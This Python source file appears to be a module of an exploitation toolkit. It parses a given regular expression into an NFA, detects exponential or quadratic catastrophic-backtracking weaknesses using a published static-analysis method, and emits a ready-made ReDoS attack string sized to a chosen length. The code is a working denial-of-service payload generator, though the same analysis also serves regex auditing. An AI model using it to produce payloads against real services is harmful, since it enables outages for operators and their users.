from options import Options
import itertools
import copy
from . import regex_common
import string

options = Options()
options.add_option('regex', 'your_regex', 'Regex to exploit, if vulnerable')
options.add_option('max_length', 25, 'Maximum size of exploit string, if regex is vulnerable')
options.add_option('show_nfa', False, 'Whether to show the parsed NFA graph (for debugging)')
options.add_option('include_quadratic', True, 'Whether to include quadratic runtime vulnerabilities')

DESCRIPTION = 'Exploits regex that are vulnerable to catastrophic backtracking (ReDoS).' \
              '\n\n  ' \
              'Given a regex, it is first checked to see if it is vulnerable to ReDoS attack. There are two checks: ' \
              'if it is vulnerable to an exponential attack, or a quadratic attack. Exponential attacks have a much ' \
              'more significant effect with a shorter string length, whereas a quadratic attack likely needs a larger ' \
              'string length to have an effect. Once it is determined that a regex is vulnerable, a string is output ' \
              'that when matched against the regex, will result in a large amount of resources needed to determine if ' \
              'the string matches (and will likely never finish). The larger the exploit string length, the longer this ' \
              'will take. Algorithms used are from "Static Detection of DoS Vulnerabilities in Programs that use Regular ' \
              'Expressions", by Wustholz, Olivo, Heule, and Dillig.'
NO_INPUT = True
DEFAULT_OUTPUT = 'stdout'


def next_state(nfa):
    state = len(nfa['states'])
    while state in nfa['states']:
        state += 1
    return state


# Taken from PySimpleAutomata and modified to support epsilon
def nfa_intersection(nfa_1, nfa_2):
    """ Returns a NFA that reads the intersection of the NFAs in
    input.
    Let :math:`A_1 = (Σ,S_1,S_1^0,ρ_1,F_1)` and :math:`A_2 =(Σ,
    S_2,S_2^0,ρ_2,F_2)` be two NFAs.
    There is a NFA :math:`A_∧` that runs simultaneously both
    :math:`A_1` and :math:`A_2` on the input word,
    so :math:`L(A_∧) = L(A_1)∩L(A_2)`.
    It is defined as:
    :math:`A_∧ = ( Σ , S , S_0 , ρ , F )`
    where
    • :math:`S = S_1 × S_2`
    • :math:`S_0 = S_1^0 × S_2^0`
    • :math:`F = F_1 × F_2`
    • :math:`((s,t), a, (s_X , t_X)) ∈ ρ` iff :math:`(s, a,s_X )
      ∈ ρ_1` and :math:`(t, a, t_X ) ∈ ρ_2`
    :param dict nfa_1: first input NFA;
    :param dict nfa_2: second input NFA;
    :return: *(dict)* representing the intersected NFA.
    """
    intersection = {
        'alphabet': nfa_1['alphabet'].intersection(nfa_2['alphabet']),
        'states': set(),
        'initial_states': set(),
        'accepting_states': set(),
        'transitions': dict()
    }
    for init_1 in nfa_1['initial_states']:
        for init_2 in nfa_2['initial_states']:
            intersection['initial_states'].add((init_1, init_2))

    intersection['states'].update(intersection['initial_states'])

    boundary = set()
    boundary.update(intersection['initial_states'])
    while boundary:
        (state_nfa_1, state_nfa_2) = boundary.pop()
        if state_nfa_1 in nfa_1['accepting_states'] and state_nfa_2 in nfa_2['accepting_states']:
            intersection['accepting_states'].add((state_nfa_1, state_nfa_2))
        for a in intersection['alphabet']:
            if type(a) == regex_common.Transitions:
                if (state_nfa_1, a) in nfa_1['transitions']:
                    for destination_1 in nfa_1['transitions'][state_nfa_1, a]:
                        next_state = (destination_1, state_nfa_2)
                        if next_state not in intersection['states']:
                            intersection['states'].add(next_state)
                            boundary.add(next_state)
                        intersection['transitions'].setdefault(
                            ((state_nfa_1, state_nfa_2), a), set()).add(next_state)
                        if destination_1 in nfa_1['accepting_states'] and state_nfa_2 in nfa_2['accepting_states']:
                            intersection['accepting_states'].add(next_state)

                if (state_nfa_2, a) in nfa_2['transitions']:
                    for destination_2 in nfa_2['transitions'][state_nfa_2, a]:
                        next_state = (state_nfa_1, destination_2)
                        if next_state not in intersection['states']:
                            intersection['states'].add(next_state)
                            boundary.add(next_state)
                        intersection['transitions'].setdefault(
                            ((state_nfa_1, state_nfa_2), a), set()).add(next_state)
                        if state_nfa_2 in nfa_1['accepting_states'] and destination_2 in nfa_2['accepting_states']:
                            intersection['accepting_states'].add(next_state)
                continue
            if ((state_nfa_1, a) not in nfa_1['transitions'] or
                (state_nfa_2, a) not in nfa_2['transitions']):
                continue
            s1 = nfa_1['transitions'][state_nfa_1, a]
            s2 = nfa_2['transitions'][state_nfa_2, a]

            for destination_1 in s1:
                for destination_2 in s2:
                    next_state = (destination_1, destination_2)
                    if next_state not in intersection['states']:
                        intersection['states'].add(next_state)
                        boundary.add(next_state)
                    intersection['transitions'].setdefault(
                        ((state_nfa_1, state_nfa_2), a), set()).add(next_state)
                    if destination_1 in nfa_1['accepting_states'] and destination_2 in nfa_2['accepting_states']:
                        intersection['accepting_states'].add(next_state)

    return intersection


def get_potential_outgoing_tuples(state, nfa):
    results = []
    for (transition_state, transition_character), targets in nfa['transitions'].items():
        if state == transition_state:
            for state_1, state_2 in itertools.product(targets, repeat=2):
                if state_1 != state_2:
                    results.append((transition_character, state_1, state_2))
    return results


def get_any_loopback_nfa(nfa, state):
    new_state = next_state(nfa)
    new_states = copy.deepcopy(nfa['states'])
    new_states.add(new_state)
    new_transitions = copy.deepcopy(nfa['transitions'])
    for transition in nfa['transitions'].items():
        init_state = transition[0][0]
        character = transition[0][1]
        dest_set = transition[1]
        if init_state != state:
            continue
        new_transitions.setdefault((new_state, character), set()).update(dest_set)
    return {
        'alphabet': copy.deepcopy(nfa['alphabet']),
        'states': new_states,
        'transitions': new_transitions,
        'initial_states': set([new_state]),
        'accepting_states': set([state]),
    }


def get_loopback_nfa(nfa, target_state, character, pseudo_start_state):
    new_state = next_state(nfa)
    new_states = copy.deepcopy(nfa['states'])
    new_states.add(new_state)
    new_transitions = copy.deepcopy(nfa['transitions'])
    new_transitions[(new_state, character)] = set([pseudo_start_state])
    return {
        'alphabet': copy.deepcopy(nfa['alphabet']),
        'states': new_states,
        'transitions': new_transitions,
        'initial_states': set([new_state]),
        'accepting_states': set([target_state]),
    }


def find_shortest_path(nfa):
    assert len(nfa['initial_states']) == 1
    queue = [(next(iter(nfa['initial_states'])), [])]
    visited = set()
    while len(queue) > 0:
        node, transitions_list = queue.pop(0)
        if node in nfa['accepting_states']:
            return transitions_list
        for (start_node, character), destinations in nfa['transitions'].items():
            if start_node != node:
                continue
            for d in destinations:
                if d in visited:
                    continue
                new_transitions_list = copy.deepcopy(transitions_list)
                new_transitions_list.append(character)
                queue.append((d, new_transitions_list))
                visited.add(d)
    return None


def stringify_result(result):

    start_pattern = [x for x in result[0] if x != regex_common.Transitions.EPSILON]
    repeat_pattern = [x for x in result[1] if x != regex_common.Transitions.EPSILON]
    return ''.join(start_pattern), ''.join(repeat_pattern)


def find_hyper_vulnerabilities_for_pivot(state, nfa):
    for (character, state_1, state_2) in get_potential_outgoing_tuples(state, nfa):
        print((character, state_1, state_2))
        nfa_1 = get_loopback_nfa(nfa, state, character, state_1)
        nfa_2 = get_loopback_nfa(nfa, state, character, state_2)
        intersection_nfa = nfa_intersection(nfa_1, nfa_2)

        if len(intersection_nfa['accepting_states']) == 0:
            continue

        repeat_pattern = find_shortest_path(intersection_nfa)
        initial_nfa = copy.deepcopy(nfa)
        initial_nfa['accepting_states'] = set([state])
        start_pattern = find_shortest_path(initial_nfa)
        for c in string.printable:
            if (state, c) in nfa['transitions']:
                if len(nfa['transitions'][(state, c)].union(nfa['accepting_states'])) == 0:
                    return start_pattern, repeat_pattern
            else:
                return start_pattern, repeat_pattern
    return None


def _find_quadratic_vulnerabilities_for_pivot(nfa, state, state_1, state_2, character):
    nfa_1 = get_loopback_nfa(nfa, state, character, state_1)
    nfa_p = {  # prefix NFA
        'alphabet': copy.deepcopy(nfa['alphabet']),
        'states': copy.deepcopy(nfa['states']),
        'transitions': copy.deepcopy(nfa['transitions']),
        'initial_states': copy.deepcopy(nfa['initial_states']),
        'accepting_states': set([state])
    }
    for q in nfa['states']:
        new_state = next_state(nfa)
        transitions = copy.deepcopy(nfa['transitions'])
        transitions[(new_state, character)] = set([state_2])
        nfa_2 = {
            'states': nfa['states'].union(set([new_state])),
            'alphabet': copy.deepcopy(nfa['alphabet']),
            'transitions': transitions,
            'initial_states': set([new_state]),
            'accepting_states': set([q])
        }
        nfa_3 = get_any_loopback_nfa(nfa, q)
        nfa_s = {  # eventually will be used for suffix
            'alphabet': copy.deepcopy(nfa['alphabet']),
            'states': copy.deepcopy(nfa['states']),
            'transitions': copy.deepcopy(nfa['transitions']),
            'initial_states': set([q]),
            'accepting_states': copy.deepcopy(nfa['accepting_states'])
        }
        intersection_nfa = nfa_intersection(nfa_1, nfa_2)
        intersection_nfa = nfa_intersection(intersection_nfa, nfa_3)

        if len(intersection_nfa['accepting_states']) == 0:
            continue
        repeat_pattern = find_shortest_path(intersection_nfa)
        start_pattern = find_shortest_path(nfa_p)
        for c in string.printable:
            if (state, c) in nfa['transitions']:
                if len(nfa['transitions'][(state, c)].union(nfa['accepting_states'])) == 0:
                    return start_pattern, repeat_pattern
            else:
                return start_pattern, repeat_pattern
    return None


def find_quadratic_vulnerabilities_for_pivot(state, nfa):
    for (character, state_1, state_2) in get_potential_outgoing_tuples(state, nfa):
        result = _find_quadratic_vulnerabilities_for_pivot(nfa, state, state_1, state_2, character)
        if result is not None:
            return result
        result = _find_quadratic_vulnerabilities_for_pivot(nfa, state, state_2, state_1, character)
        if result is not None:
            return result
    return None


def free_transition_to_state(nfa, state, dest, visited):
    for d in nfa['transitions'].get((state, regex_common.Transitions.EPSILON), set()):
        if d == dest:
            return True
        if d in visited:
            continue
        visited.update([d])
        if free_transition_to_state(nfa, d, dest, visited):
            return True
    return False


def equivalent_to_accepting_state(state, nfa):
    for a in nfa['accepting_states']:
        if (free_transition_to_state(nfa, a, state, set()) or
            free_transition_to_state(nfa, state, a, set())):
            return True
    return False


def find_hyper_vulnerabilities(nfa):
    for q in nfa['states']:
        if equivalent_to_accepting_state(q, nfa):
            continue
        vuln = find_hyper_vulnerabilities_for_pivot(q, nfa)
        if vuln is not None:
            print('state = {}'.format(q))
            return stringify_result(vuln)

    return None


def find_quadratic_vulnerabilities(nfa):
    for q in nfa['states']:
        if equivalent_to_accepting_state(q, nfa):
            continue
        vuln = find_quadratic_vulnerabilities_for_pivot(q, nfa)
        if vuln is not None:
            return stringify_result(vuln)
    return None


def run(output):
    parser = regex_common.RegexParser()
    nfa = parser.run(options['regex'])

    if options['show_nfa']:
        # TODO - we don't want to print anything in exploit modules. Perhaps just show graph?
        #pprint.pprint(nfa)
        regex_common.RegexParser.show_graph(nfa)

    vulnerable_pattern = find_hyper_vulnerabilities(nfa)
    if vulnerable_pattern is None and options['include_quadratic']:
        vulnerable_pattern = find_quadratic_vulnerabilities(nfa)
    if vulnerable_pattern is None:
        raise ValueError('Regex is not vulnerable to ReDoS attack')

    prefix, attack = vulnerable_pattern
    if len(prefix) + len(attack) > options['max_length']:
        raise ValueError('Max length too small, cannot exploit regex')

    exploit_string = prefix + (((options['max_length'] - len(prefix)) // len(attack)) * attack)

    output.output([exploit_string])
